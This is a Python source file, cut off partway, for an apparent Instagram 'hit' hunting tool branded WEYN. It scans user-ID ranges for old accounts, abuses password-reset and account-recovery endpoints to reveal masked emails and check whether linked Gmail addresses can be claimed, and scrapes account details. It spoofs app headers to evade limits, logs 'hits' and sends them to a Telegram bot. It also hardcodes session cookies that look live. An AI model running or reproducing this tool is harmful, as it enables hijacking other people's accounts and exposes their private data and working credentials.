import os
import sys
import re
import json
import string
import random
from random import randrange, choice
import uuid
import time
from datetime import datetime
from threading import Thread, Lock, Event
import requests
import urllib.parse
import base64
import secrets
from colorama import Fore, Style, init
from concurrent.futures import ThreadPoolExecutor, as_completed
from itertools import cycle
import hashlib
import httpx

init(autoreset=True)

R     = Fore.RED
G     = Fore.GREEN
Y     = Fore.YELLOW
C     = Fore.CYAN
W     = Fore.WHITE
M     = Fore.MAGENTA
RESET = Style.RESET_ALL
B     = Style.BRIGHT

ID_RANGES = [
    (1,           100000000,  2010),
    (100000001,   279760000,  2011),
    (279760001,   900990000,  2012),
    (900990001,   1629010000, 2013),
    (1629010001,  2400000000, 2014),
    (2400000001,  3200000000, 2015),
    (3200000001,  3900000000, 2016),
    (3900000001,  4500000000, 2017),
    (4500000001,  5000000000, 2018),
    (5000000001,  6000000000, 2019),
]

def gdate(user_id):
    try:
        user_id = int(user_id)
        for lower, upper, year in ID_RANGES:
            if lower <= user_id <= upper:
                return year
        return 2019
    except Exception:
        return 2019

# ── Hits file ──
HITS_FILE       = "weyn_hits.txt"
_hits_file_lock = Lock()

def _write_session_separator(method_num):
    ts  = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    sep = (
        "\n" +
        "═" * 54 + "\n" +
        f"  SESSION — METHOD {method_num}  |  {ts}\n" +
        "═" * 54 + "\n\n"
    )
    with _hits_file_lock:
        with open(HITS_FILE, 'a', encoding='utf-8') as f:
            f.write(sep)

def _save_hit_to_file(output):
    with _hits_file_lock:
        with open(HITS_FILE, 'a', encoding='utf-8') as f:
            f.write(output + "\n\n")

# ── Global session registry (used by Stop to kill in-flight requests) ──
_active_sessions      = []
_active_sessions_lock = Lock()

def _register_session(s):
    with _active_sessions_lock:
        _active_sessions.append(s)
    return s

def close_all_sessions():
    with _active_sessions_lock:
        for s in _active_sessions:
            try:
                s.close()
            except Exception:
                pass
        _active_sessions.clear()

def _send_telegram(token, chat_id, text):
    try:
        resp = requests.post(
            f"https://api.telegram.org/bot{token}/sendMessage",
            json={"chat_id": chat_id, "text": text},
            timeout=10
        )
        body = resp.json()
        if body.get('ok'):
            _web_state['tg_status'] = 'ok'
            _web_state['tg_error']  = ''
        else:
            err = body.get('description', 'Unknown Telegram error')
            _web_state['tg_status'] = 'error'
            _web_state['tg_error']  = err
    except Exception as e:
        _web_state['tg_status'] = 'error'
        _web_state['tg_error']  = str(e)

def get_year_range(year_choice):
    if year_choice is None:
        return 1, 6000000000
    for lower, upper, year in ID_RANGES:
        if year == year_choice:
            return lower, upper
    return 1, 6000000000

# ── WEYN hit message format (retained) ──
def format_hit(hit_num, username, email, followers, following, bio,
               year_label, reset_text, join_date, country,
               masked=None, former=None):
    about_lines = (
        f"│  𝐉𝐨𝐢𝐧𝐞𝐝     ➤  {join_date}\n"
        f"│  𝐘𝐞𝐚𝐫       ➤  {year_label}\n"
        f"│  𝐂𝐨𝐮𝐧𝐭𝐫𝐲    ➤  {country}\n"
        f"│  𝐅𝐨𝐫𝐦𝐞𝐫     ➤  {former or '-'}\n"
    )
    masked_line = f"│  𝐌𝐚𝐬𝐤𝐞𝐝     ➤  {masked}\n" if masked else ""
    return f"""
╔═━━━────────────━━━═╗
        WEYN IG HIT #{hit_num}
╚═━━━────────────━━━═╝

╭──〔🔛 W E Y N TOOLS🔛〕─────────────╮
│
│  𝐔𝐬𝐞𝐫𝐧𝐚𝐦𝐞   ➤  @{username}
│  𝐄𝐦𝐚𝐢𝐥      ➤  {email}
│  𝐅𝐨𝐥𝐥𝐨𝐰𝐞𝐫𝐬  ➤  {followers}
│  𝐅𝐨𝐥𝐥𝐨𝐰𝐢𝐧𝐠  ➤  {following}
│  𝐁𝐢𝐨        ➤  {bio}
│  𝐑𝐞𝐬𝐞𝐭      ➤  {reset_text}
│
├──〔 𝐏𝐑𝐎𝐅𝐈𝐋𝐄 𝐋𝐈𝐍𝐊 〕──────────────────┤
│
│  https://www.instagram.com/{username}
│
├──〔 𝐀𝐁𝐎𝐔𝐓 𝐓𝐇𝐈𝐒 𝐀𝐂𝐂𝐎𝐔𝐍𝐓 〕───────────┤
│
{about_lines}{masked_line}│
╰──────────────────────────────────────╯

        @jinbelowg @weyn_vouches
"""


# ══════════════════════════════════════════════════════════
#  METHOD 1 — STATE & COUNTERS
# ══════════════════════════════════════════════════════════

_m1_hits         = 0
_m1_bad_insta    = 0
_m1_bad_email    = 0
_m1_good_insta   = 0
_m1_total        = 0
_m1_taken        = 0
_m1_limit        = 0
_m1_scanned      = 0
_m1_found_emails = []
_m1_found_lock   = Lock()
_m1_hit_lock     = Lock()

_web_state = {
    'running': False, 'method': None,
    'hits': 0, 'good': 0, 'bad_insta': 0, 'bad_email': 0,
    'taken': 0, 'limit': 0, 'total': 0, 'verified': 0,
    'recent_hits': [],
    'tg_status': '', 'tg_error': '',
}
_web_lock = Lock()

# ── Session pool for "About This Account" ──
_m1_ABOUT_SESSION_INDEX = 0
_m1_ABOUT_SESSION_LOCK  = Lock()
_m1_ABOUT_SESSION_ID    = ""
_m1_ABOUT_CSRF_TOKEN    = ""
_m1_ABOUT_DS_USER_ID    = ""
_m1_ABOUT_COOKIE_STR    = ""
_m1_about_token_lock    = Lock()
_m1_about_tokens        = {
    "fb_dtsg": None, "lsd": None,
    "rev": "1035271382",
    "bkv": "61fc9465e13b77eaa110f317859102ba7fb93a0a2bcc08c46473da6713640739"
}
_m1_session  = requests.Session()
_m1__session = requests.Session()

HARDCODED_SESSIONS = [
    {
        "csrftoken": "SA7WOqODWLd9lq8tepS9lO5hEyQiiAjf",
        "mid": "acXucwABAAEpLL9LTj_zE5mdFUm4",
        "ig_did": "68B3C797-5435-4284-91DF-36BB57ACE8EC",
        "sessionid": "37980233613%3AzkmZM0x4USstRi%3A13%3AAYgWd5cwudKpm1w0dyEb0AD6LFdG2zY5HVncDeFJfA",
        "ds_user_id": "37980233613"
    },
    {
        "csrftoken": "tPvqXDZm6bD62k-_0a2rRl",
        "mid": "acVQKgABAAHxWQ3ymupl3SPVKxqV",
        "ig_did": "02AD7E3A-B843-43E2-B5BD-520BA7392ACA",
        "sessionid": "74090320231%3ACtvz4lnFouLKGZ%3A25%3AAYg8Be6H6r7-c9Vz5Jhewf-KhM-nvusIhXYYRBqZUw",
        "ds_user_id": "74090320231"
    }
]

_M1_VIP_CONFIG = {
    "vip_date_filter": True,
    "vip_follower_filter": False,
    "vip_min_followers": 0,
    "vip_date_min": 2010,
    "vip_date_max": 2019,
    "vip_about_info": True,
    "vip_country": False
}

_M1_CONFIG = {
    "insta_graphql": "https://www.instagram.com/api/graphql",
    "google_url": "https://accounts.google.com",
    "form_type": "application/x-www-form-urlencoded; charset=UTF-8",
    "token_file": "tokens.txt",
    "domain": "@gmail.com",
    "id_ranges": ID_RANGES,
}

_M1_ABOUT_WEB_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 OPR/128.0.0.0"

_M1_USER_AGENTS = [
    "Instagram 320.0.0.34.109 Android (33/13; 420dpi; 1080x2340; samsung; SM-A546B; a54x; exynos1380; en_US; 465123678)",
    "Instagram 319.0.0.30.121 Android (31/12; 440dpi; 1080x2400; xiaomi; M2101K6G; sweet; qcom; en_GB; 454782345)",
    "Instagram 322.0.0.45.112 Android (34/14; 480dpi; 1240x2772; OnePlus; CPH2449; ONEPLUS11; qcom; en_US; 489234551)",
    "Instagram 322.0.0.45.112 Android (34/14; 420dpi; 1080x2400; google; Pixel 7; panther; gs201; en_US; 493245782)",
    "Instagram 318.0.0.22.110 Android (29/10; 400dpi; 1080x2310; HUAWEI; ELE-L29; hwELE; kirin980; en_GB; 439875334)",
    "Instagram 320.0.0.34.109 Android (33/13; 440dpi; 1080x2400; vivo; V2145; PD2145; mt6893; en_US; 478932112)",
    "Instagram 321.0.0.28.120 Android (33/13; 420dpi; 1080x2400; samsung; SM-S911B; dm1q; qcom; en_US; 475223914)",
    "Instagram 321.0.0.28.120 Android (33/13; 440dpi; 1080x2400; xiaomi; 2211133G; ruby; mt6983; en_US; 467882419)",
    "Instagram 319.0.0.30.121 Android (32/12; 480dpi; 1080x2412; OnePlus; CPH2413; NE2213; qcom; en_GB; 453228190)",
    "Instagram 318.0.0.22.110 Android (30/11; 420dpi; 1080x2400; realme; RMX3311; serpent; qcom; en_US; 442119875)",
    "Instagram 320.0.0.34.109 Android (33/13; 440dpi; 1080x2340; samsung; SM-M526BR; m52x; qcom; en_US; 483662991)",
    "Instagram 322.0.0.45.112 Android (34/14; 400dpi; 1080x2400; sony; XQ-CT72; pdx234; qcom; en_US; 498722341)",
    "Instagram 319.0.0.30.121 Android (31/12; 420dpi; 1080x2400; oppo; CPH2457; PHB110; mt6895; en_US; 462775910)",
    "Instagram 321.0.0.28.120 Android (33/13; 480dpi; 1080x2340; samsung; SM-A346B; a34x; mt6877; en_GB; 479201567)",
    "Instagram 322.0.0.45.112 Android (34/14; 440dpi; 1080x2400; motorola; XT2303-2; crosby; qcom; en_US; 492874115)",
    "Instagram 318.0.0.22.110 Android (30/11; 420dpi; 1080x2376; honor; FNE-NX9; fne; kirin9000; en_GB; 431597221)",
    "Instagram 320.0.0.34.109 Android (33/13; 400dpi; 1080x2400; xiaomi; 2201117TY; veux; qcom; en_US; 487266531)",
    "Instagram 319.0.0.30.121 Android (32/12; 440dpi; 1080x2340; samsung; SM-M336B; m33x; exynos1280; en_US; 471823650)",
    "Instagram 321.0.0.28.120 Android (33/13; 420dpi; 1080x2400; realme; RMX3710; halo; mt6833; en_GB; 469862234)",
    "Instagram 322.0.0.45.112 Android (34/14; 480dpi; 1440x3120; lg; LM-V600; judyln; qcom; en_US; 499178234)",
    "Instagram 370.1.0.43.96 Android (34/14; 450dpi; 1080x2207; samsung; SM-A235F; a23; qcom; en_IN; 704872281)",
    "Instagram 368.0.0.45.96 Android (30/11; 440dpi; 1080x2220; Xiaomi/Redmi; 23127PN0CC; begonia; mt6785; ar_EG; 700073482)",
]

_M1_BASE_URL      = "https://www.instagram.com"
_M1_RESET_URL     = "https://www.instagram.com/accounts/password/reset/"
_M1_SEND_AJAX_URL = "https://www.instagram.com/api/v1/web/accounts/account_recovery_send_ajax/"
_M1_UA_WEB        = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36"
_M1_UA_APP        = "Instagram 320.0.0.34.109 Android (33/13; 420dpi; 1080x2340; samsung; SM-A546B; a54x; exynos1380; tr_TR; 465123678)"


# ── About-session helpers ──

def _m1_build_cookie_str(s):
    return (
        f"csrftoken={s['csrftoken']}; "
        f"ig_did={s['ig_did']}; "
        f"mid={s['mid']}; "
        f"ds_user_id={s['ds_user_id']}; "
        f"sessionid={s['sessionid']}"
    )

def _m1_next_about_session():
    global _m1_ABOUT_SESSION_INDEX, _m1_ABOUT_SESSION_ID, _m1_ABOUT_CSRF_TOKEN
    global _m1_ABOUT_DS_USER_ID, _m1_ABOUT_COOKIE_STR
    with _m1_ABOUT_SESSION_LOCK:
        s = HARDCODED_SESSIONS[_m1_ABOUT_SESSION_INDEX % len(HARDCODED_SESSIONS)]
        _m1_ABOUT_SESSION_INDEX += 1
    _m1_ABOUT_SESSION_ID  = s["sessionid"]
    _m1_ABOUT_CSRF_TOKEN  = s["csrftoken"]
    _m1_ABOUT_DS_USER_ID  = s["ds_user_id"]
    _m1_ABOUT_COOKIE_STR  = _m1_build_cookie_str(s)
    return s

def _m1_random_about_session():
    s = random.choice(HARDCODED_SESSIONS)
    return s["sessionid"], s["csrftoken"], s["ds_user_id"], _m1_build_cookie_str(s)

def _m1_about_refresh_tokens(cookie_str=None, username="instagram"):
    global _m1_about_tokens, _m1_ABOUT_SESSION_ID, _m1_ABOUT_COOKIE_STR
    if not _m1_ABOUT_SESSION_ID:
        return False
    _cookie = cookie_str or _m1_ABOUT_COOKIE_STR
    try:
        resp = requests.get(
            f"https://www.instagram.com/{username}/",
            headers={
                "User-Agent": _M1_ABOUT_WEB_UA,
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7",
                "Accept-Encoding": "gzip, deflate",
                "Cookie": _cookie,
                "Referer": "https://www.instagram.com/",
            },
            timeout=10
        )
        html  = resp.text
        m     = re.search(r'"f":"([^"]+)"', html)
        m2    = re.search(r'"LSD"[^}]*"token":"([^"]+)"', html)
        m3    = re.search(r'"server_revision":(\d+)', html)
        m4    = re.search(r'__bkv=([a-f0-9]{40,})', html)
        m5    = re.search(r'"hsi":"([^"]+)"', html)
        dyn_m = re.search(r'"__dyn":"([^"]+)"', html)
        csr_m = re.search(r'"__csr":"([^"]+)"', html)
        with _m1_about_token_lock:
            if m:     _m1_about_tokens["fb_dtsg"] = m.group(1)
            if m2:    _m1_about_tokens["lsd"]     = m2.group(1)
            if m3:    _m1_about_tokens["rev"]     = m3.group(1)
            if m4:    _m1_about_tokens["bkv"]     = m4.group(1)
            if m5:    _m1_about_tokens["hsi"]     = m5.group(1)
            if dyn_m: _m1_about_tokens["dyn"]     = dyn_m.group(1)
            if csr_m: _m1_about_tokens["csr"]     = csr_m.group(1)
        return _m1_about_tokens["fb_dtsg"] is not None
    except Exception:
        return False

def _m1_about_token_refresher():
    while True:
        try:
            if not _m1_about_tokens.get("fb_dtsg"):
                _m1_next_about_session()
                _m1_about_refresh_tokens(_m1_ABOUT_COOKIE_STR)
            else:
                _m1_about_refresh_tokens(_m1_ABOUT_COOKIE_STR)
        except Exception:
            pass
        time.sleep(60)

def _m1_try_get_about(user_id, username):
    try:
        _sid, _csrf, _dsid, _cookie = _m1_random_about_session()
        with _m1_about_token_lock:
            fb_dtsg = _m1_about_tokens.get("fb_dtsg")
            lsd     = _m1_about_tokens.get("lsd") or ''.join(random.choices(string.ascii_letters + string.digits, k=10))
            rev     = _m1_about_tokens.get("rev", "1035271382")
            bkv     = _m1_about_tokens.get("bkv", "61fc9465e13b77eaa110f317859102ba7fb93a0a2bcc08c46473da6713640739")
        if not fb_dtsg:
            return {"join_date": None, "country": None, "former_usernames": []}
        hsi     = _m1_about_tokens.get("hsi", "7618017801523903853")
        dyn     = _m1_about_tokens.get("dyn", "7xeUjG1mxu1syUbFp41twpUnwgU7SbzEdF8aUco2qwJxS0DU2wx609vCwjE1EE2Cw8G11wBz81s8hwGxu786a3a1YwBgao6C0Mo2")
        csr     = _m1_about_tokens.get("csr", "")
        jazoest = '2' + str(sum(ord(c) for c in fb_dtsg))
        spin_t  = str(int(time.time()))
        post_params = {
            "__d": "www", "__user": "0", "__a": "1", "__req": "15",
            "__hs": "20529.HYP:instagram_web_pkg.2.1...0", "dpr": "1",
            "__ccg": "EXCELLENT", "__rev": rev, "__hsi": hsi,
            "__dyn": dyn, "__csr": csr, "__comet_req": "7",
            "__crn": "comet.igweb.PolarisProfilePostsTabRoute",
            "fb_dtsg": fb_dtsg, "jazoest": jazoest, "lsd": lsd,
            "__spin_r": rev, "__spin_b": "trunk", "__spin_t": spin_t,
            "params": json.dumps({"referer_type": "ProfileMore", "target_user_id": str(user_id)}),
        }
        url  = f"https://www.instagram.com/async/wbloks/fetch/?appid=com.bloks.www.ig.about_this_account&type=app&__bkv={bkv}"
        resp = requests.post(url, headers={
            "User-Agent": _M1_ABOUT_WEB_UA,
            "Accept": "*/*",
            "Accept-Language": "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7",
            "Accept-Encoding": "gzip, deflate",
            "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8",
            "Origin": "https://www.instagram.com",
            "Referer": f"https://www.instagram.com/{username}/",
            "Cookie": _cookie,
            "X-CSRFToken": _csrf,
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
        }, data=urllib.parse.urlencode(post_params), timeout=10)
        raw = resp.text
        if raw.startswith("for (;;);"):
            raw = raw[9:]
        parsed = json.loads(raw)
        if parsed.get("error") or parsed.get("status") == "fail":
            with _m1_about_token_lock:
                _m1_about_tokens["fb_dtsg"] = None
            return {"join_date": None, "country": None, "former_usernames": []}
        result   = {"join_date": None, "country": None, "former_usernames": []}
        text_str = json.dumps(parsed, ensure_ascii=False)
        for pat in [r'Kat\u0131lma tarihi ([A-Za-z\u00c7\u00e7\u011e\u011f\u0130\u0131\u00d6\u00f6\u015e\u015f\u00dc\u00fc]+ \d{4})',
                    r'Date joined ([A-Za-z]+ \d{4})']:
            mt = re.search(pat, text_str)
            if mt:
                result["join_date"] = mt.group(1)
                break
        try:
            data_arr = parsed.get("payload", {}).get("layout", {}).get("bloks_payload", {}).get("data", [])
            for item in data_arr:
                if isinstance(item, dict):
                    d   = item.get("data", {})
                    key = d.get("key", "")
                    if "about_this_account_country" in key and "visibility" not in key:
                        result["country"] = d.get("initial", "Payla\u015f\u0131lmad\u0131")
                        break
        except Exception:
            pass
        former = re.findall(r'nceki kullan[^"]*"([a-zA-Z0-9._]{2,30})"', text_str)
        if former:
            result["former_usernames"] = list(set(former))
        return result
    except Exception:
        return {"join_date": None, "country": None, "former_usernames": []}

def _m1_get_about_account(user_id, username):
    if not _m1_about_tokens.get("fb_dtsg"):
        _m1_about_refresh_tokens(_m1_ABOUT_COOKIE_STR, username)
    result = _m1_try_get_about(user_id, username)
    if result.get("join_date") or result.get("country") or result.get("former_usernames"):
        return result
    try:
        _m1_next_about_session()
        _m1_about_refresh_tokens(_m1_ABOUT_COOKIE_STR, username)
        return _m1_try_get_about(user_id, username)
    except Exception:
        pass
    return result


# ── Instagram email check ──

def _m1_rest_web_check_email(email):
    try:
        with httpx.Client(http2=True, timeout=6) as client:
            response = client.post(
                "https://i.instagram.com/api/v1/users/check_email/",
                data={"email": email},
                headers={
                    "User-Agent": "Instagram 166.0.0.30.120 Android (30/11; 1440dpi; 2560x1440; samsung; SM-G973F; x86_64; tablet; en_US; kirin)",
                    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                }
            )
            return response.json().get("allow_shared_email_registration") is True
    except Exception:
        return False

def _m1_rest_bloks_v2(email):
    global _m1_limit
    url     = "https://i.instagram.com/api/v1/bloks/async_action/com.bloks.www.caa.ar.search.async/"
    device  = str(uuid.uuid4())
    family  = str(uuid.uuid4())
    android = "android-" + secrets.token_hex(8)
    uid4_4  = str(uuid.uuid4())
    aac_obj = json.dumps({
        "aac_init_timestamp": int(time.time()),
        "aacjid": str(uuid.uuid4()),
        "aaccs": secrets.token_urlsafe(32)
    }, separators=(',', ':'))
    params_obj = {
        "client_input_params": {
            "aac": aac_obj,
            "flash_call_permissions_status": {
                "READ_PHONE_STATE": "PERMANENTLY_DENIED",
                "READ_CALL_LOG": "DENIED",
                "ANSWER_PHONE_CALLS": "DENIED"
            },
            "was_headers_prefill_available": 0,
            "network_bssid": None,
            "sfdid": "",
            "fetched_email_token_list": {},
            "search_query": email,
            "auth_secure_device_id": "",
            "ig_oauth_token": [],
            "cloud_trust_token": None,
            "was_headers_prefill_used": 0,
            "sso_accounts_auth_data": [],
            "encrypted_msisdn": "",
            "device_network_info": None,
            "text_input_id": "akyuf0:61",
            "zero_balance_state": None,
            "android_build_type": "release",
            "accounts_list": [],
            "is_oauth_without_permission": 0,
            "ig_android_qe_device_id": device,
            "gms_incoming_call_retriever_eligibility": "client_not_supported",
            "search_screen_type": "email_or_username",
            "is_whatsapp_installed": 1,
            "lois_settings": {"lois_token": ""},
            "ig_vetted_device_nonce": None,
            "headers_infra_flow_id": "",
            "fetched_email_list": []
        },
        "server_params": {
            "event_request_id": str(uuid.uuid4()),
            "is_from_logged_out": 0,
            "layered_homepage_experiment_group": None,
            "device_id": android,
            "login_surface": "login_home",
            "waterfall_id": str(uuid.uuid4()),
            "INTERNAL__latency_qpl_instance_id": 6.3987980400102e13,
            "is_platform_login": 0,
            "context_data": "",
            "login_entry_point": "logged_out",
            "INTERNAL__latency_qpl_marker_id": 36707139,
            "family_device_id": family,
            "offline_experiment_group": "caa_iteration_v3_perf_ig_4",
            "access_flow_version": "pre_mt_behavior",
            "is_from_logged_in_switcher": 0,
            "qe_device_id": device
        }
    }
    payload = {
        'params': json.dumps(params_obj, separators=(',', ':')),
        'bk_client_context': '{"bloks_version":"5e47baf35c5a270b44c8906c8b99063564b30ef69779f3dee0b828bee2e4ef5b","styles_id":"instagram"}',
        'bloks_versioning_id': "5e47baf35c5a270b44c8906c8b99063564b30ef69779f3dee0b828bee2e4ef5b"
    }
    tz_offset = str(int(datetime.now().astimezone().utcoffset().total_seconds()))
    headers = {
        'User-Agent': "Instagram 370.1.0.43.96 Android (34/14; 450dpi; 1080x2207; samsung; SM-A235F; a23; qcom; en_IN; 704872281)",
        'accept-language': "en-IN, en-US",
        'x-bloks-version-id': "5e47baf35c5a270b44c8906c8b99063564b30ef69779f3dee0b828bee2e4ef5b",
        'x-fb-friendly-name': "IgApi: bloks/async_action/com.bloks.www.caa.ar.search.async/",
        'x-ig-android-id': android,
        'x-ig-app-id': "567067343352427",
        'x-ig-app-locale': "en_IN",
        'x-ig-client-endpoint': "com.bloks.www.caa.ar.search",
        'x-ig-device-id': device,
        'x-ig-family-device-id': family,
        'x-ig-timezone-offset': tz_offset,
        'x-mid': base64.urlsafe_b64encode(secrets.token_bytes(18)).decode().rstrip('='),
        'x-pigeon-rawclienttime': str(time.time()),
        'x-pigeon-session-id': f"UFS-{uid4_4}-0",
    }
    try:
        response = requests.post(url, data=payload, headers=headers, timeout=20)
        if email in response.text:
            return email
        elif 'SOMETHING, GOT F3CKED' in response.text:
            _m1_limit += 1
            return None
        return None
    except Exception:
        return None

def _m1_rest_bloks(email):
    try:
        result = _m1_rest_bloks_v2(email)
        if result:
            return result
    except Exception:
        pass
    try:
        headers = {
            "User-Agent": "Instagram 368.0.0.45.96 Android (30/11; 440dpi; 1080x2220; Xiaomi/Redmi; 23127PN0CC; begonia; mt6785; ar_EG; 700073482)",
            "Content-Type": "application/x-www-form-urlencoded",
            "x-bloks-version-id": "dbfb0f84b6481f4ec0a033d7947fb45db546b8cee18dde220c4c1eefd3bb3dcb",
            "x-ig-app-id": "567067343352427",
        }
        data = {
            "search_query": email,
            "bloks_versioning_id": "dbfb0f84b6481f4ec0a033d7947fb45db546b8cee18dde220c4c1eefd3bb3dcb"
        }
        with httpx.Client(http2=True, timeout=8) as client:
            r = client.post(
                "https://i.instagram.com/api/v1/bloks/async_action/com.bloks.www.caa.ar.search.async/",
                data=data, headers=headers
            )
        if f"We sent a link to {email}. Use that link to confirm your account." in r.text:
            return email
        return None
    except Exception:
        return None

def _m1_lookup_instagram(email):
    if _m1_rest_web_check_email(email):
        return True
    try:
        if _m1_rest_bloks(email):
            return True
    except Exception:
        pass
    return False

def _m1_rest_v1(username):
    max_retries = 2
    for attempt in range(max_retries):
        try:
            client = httpx.Client(http2=True, follow_redirects=True)
            try:
                r0 = client.get(_M1_BASE_URL, headers={
                    "User-Agent": _M1_UA_WEB,
                    "Accept": "text/html,application/xhtml+xml,*/*;q=0.9",
                    "Accept-Language": "tr-TR,tr;q=0.9",
                    "sec-fetch-dest": "document",
                    "sec-fetch-mode": "navigate",
                    "sec-fetch-site": "none",
                })
            except Exception:
                client.close()
                if attempt < max_retries - 1:
                    continue
                return "-"
            csrf = ""
            for c in client.cookies.jar:
                if c.name == "csrftoken":
                    csrf = c.value
                    break
            if not csrf:
                client.close()
                if attempt < max_retries - 1:
                    continue
                return "-"
            headers = {
                "User-Agent"       : _M1_UA_APP,
                "Accept"           : "*/*",
                "Accept-Language"  : "tr-TR,tr;q=0.9",
                "Accept-Encoding"  : "gzip, deflate, br",
                "Content-Type"     : "application/x-www-form-urlencoded",
                "Origin"           : _M1_BASE_URL,
                "Referer"          : _M1_RESET_URL,
                "X-CSRFToken"      : csrf,
                "X-IG-App-ID"      : "936619743392459",
                "X-Requested-With" : "XMLHttpRequest",
                "X-Instagram-AJAX" : "1",
                "X-ASBD-ID"        : "129477",
                "sec-fetch-dest"   : "empty",
                "sec-fetch-mode"   : "cors",
                "sec-fetch-site"   : "same-origin",
            }
            from urllib.parse import urlencode as _urlencode
            data = _urlencode({"email_or_username": username})
            r = client.post(_M1_SEND_AJAX_URL, content=data.encode(), headers=headers)
            client.close()
            result = r.json()
            status = result.get("status", "")
            if status == "ok":
                for key in ("obfuscated_email", "contact_point", "masked_email", "email"):
                    val = result.get(key)
                    if val:
                        return val
                return "-"
            elif status == "fail":
                return "Fail: " + result.get("message", "")
            if attempt < max_retries - 1:
                continue
            return "-"
        except Exception:
            if attempt < max_retries - 1:
                continue
            return "-"
    return "-"

def _m1_get_masked(query):
    url = "https://www.instagram.com/api/graphql"
    payload = {
        'av': "0", '__d': "www", '__user': "0", '__a': "1", '__req': "f",
        '__hs': "20563.HYP:instagram_web_pkg.2.1...0", 'dpr': "3",
        '__ccg': "GOOD", '__rev': "1037676804", '__s': "nz2w5z:1vm2xs:94sap8",
        '__hsi': "7630740602831122681",
        '__dyn': "7xeUmwlEnwn8K2Wmh0no6u5U4e0yoW3q32360CEbo1nEhw2nVE4W0qa0FE2awt81s8hwnU6a3a1YwBgao6C0Mo2swlo5q4U2zxe2GewGw9a361qw8Xwn8e87q0oa2-azo7u3u2C2O0Lo6-3u2WE5B0bK1Iwqo5p0qZ6goK10xKi2K7E5y2-1mwa6byohw5ywuU1FU",
        '__csr': "hcfEI9NcRh48hnvNdsyaD6RnvOldSySDHBpKBLAF6ypAEzC4-ILahjF6S_ui-np4bmqhfR8gCaWFOmjgyiLt9EJ8FeiiGjFeaUO5XyjkBKUhByUGuhddpufW8yZeXx6aCxVxSaz8ycFbxVacxDCx2q8wwG8wHypp9UOawPADz8yaAgO9yVHwiqz89EhwCw05Cuw2eE1ooCU0gByU6IE1gUqU1ao0Vdw2tFnw1ud06Ca0M8fEx2UN7y4bEM3wo1JU2RwSyaOcayU6d7gy0A-9wi6320Ho0N60W8S02VS09vw0lWo",
        '__hsdp': "gSw8N0I1apBoBrysxGCA9cxkImy-u547Fu1lg13o6u8xy458eQ2Smm50y4FEC2Gce4mE64M09g80n9w6QG09SwjE0iCw5Nw",
        '__hblp': "05twAU5q0gum1MwuU24xS6FU98Sq0E8e88Uowda0Ek0S9U1hE0igwmuq6rwa608Gw4BwaK0BUhw9SfwXUcE34w2iE4W09iweK2O0jG1rx-8wZwaW0iq3u",
        '__sjsp': "gSw8N0I1apBoBrysxGCA8yElaxibVUkg9e0mi1Dy8ox1i3J0JBBxg8xaq9wTe",
        '__comet_req': "7",
        'lsd': "AdRhedp9xNI2uNuFwNJXmbUAOw8", 'jazoest': "22394",
        '__spin_r': "1037676804", '__spin_b': "trunk", '__spin_t': "1776670246",
        '__crn': "comet.igweb.PolarisCAAIGAccountRecoverySearchRoute",
        'qpl_active_flow_ids': "516759801",
        'fb_api_caller_class': "RelayModern",
        'fb_api_req_friendly_name': "CAAIGAccountSearchViewQuery",
        'server_timestamps': "true",
        'variables': '{"params":{"event_request_id":"7ca5daae-5770-42dd-b77b-0cf23a865a7f","next_uri":"","search_query":"' + query + '","waterfall_id":"553aadae-3ec5-4031-8395-efbabcc670ce"}}',
        'doc_id': "26178667145161478",
        'fb_api_analytics_tags': "[\"qpl_active_flow_ids=516759801\"]"
    }
    headers = {
        'User-Agent': "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
        'x-ig-app-id': "936619743392459",
        'x-fb-friendly-name': "CAAIGAccountSearchViewQuery",
        'x-fb-lsd': "AdRhedp9xNI2uNuFwNJXmbUAOw8",
        'x-csrftoken': "o_6jxh33ZvsQ2eFMyRaM_q",
        'origin': "https://www.instagram.com",
        'referer': "https://www.instagram.com/accounts/password/reset/",
        'accept-language': "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
        'Cookie': "csrftoken=o_6jxh33ZvsQ2eFMyRaM_q; datr=YMnlaTJAraHY5ADdYH8UqsTG; ig_did=2046A480-DF50-4660-A5CD-DC58F57C7A1C; mid=aeXJYAABAAGoDWzGwrGALDqzE3Np; dpr=3.558248996734619; wd=774x749"
    }
    try:
        response = requests.post(url, data=payload, headers=headers, timeout=8)
        contact_points = response.json()["data"]["caa_ar_ig_account_search"]["contact_points"]
        has_phone = any(i.get("type") == "PHONE" for i in contact_points)
        email_val = next((i["contact_point"] for i in contact_points if i["type"] == "EMAIL"), None)
        return email_val, has_phone
    except Exception:
        return None, False

def _m1_get_country_flag(country_name):
    if not country_name or country_name in ["-", "Payla\u015f\u0131lmad\u0131", "None", ""]:
        return ""
    flags = {
        "T\u00fcrkiye": "\U0001f1f9\U0001f1f7", "Irak": "\U0001f1ee\U0001f1f6",
        "Fransa": "\U0001f1eb\U0001f1f7", "Endonezya": "\U0001f1ee\U0001f1e9",
        "Arjantin": "\U0001f1e6\U0001f1f7", "Almanya": "\U0001f1e9\U0001f1ea",
        "Amerika Birle\u015fik Devletleri": "\U0001f1fa\U0001f1f8",
        "Birle\u015fik Krall\u0131k": "\U0001f1ec\U0001f1e7",
        "\u0130ngiltere": "\U0001f1ec\U0001f1e7", "\u0130talya": "\U0001f1ee\U0001f1f9",
        "\u0130spanya": "\U0001f1ea\U0001f1f8", "Hollanda": "\U0001f1f3\U0001f1f1",
        "Belçika": "\U0001f1e7\U0001f1ea", "\u0130svi\u00e7re": "\U0001f1e8\U0001f1ed",
        "Avusturya": "\U0001f1e6\U0001f1f9", "\u0130sve\u00e7": "\U0001f1f8\U0001f1ea",
        "Norve\u00e7": "\U0001f1f3\U0001f1f4", "Danimarka": "\U0001f1e9\U0001f1f0",
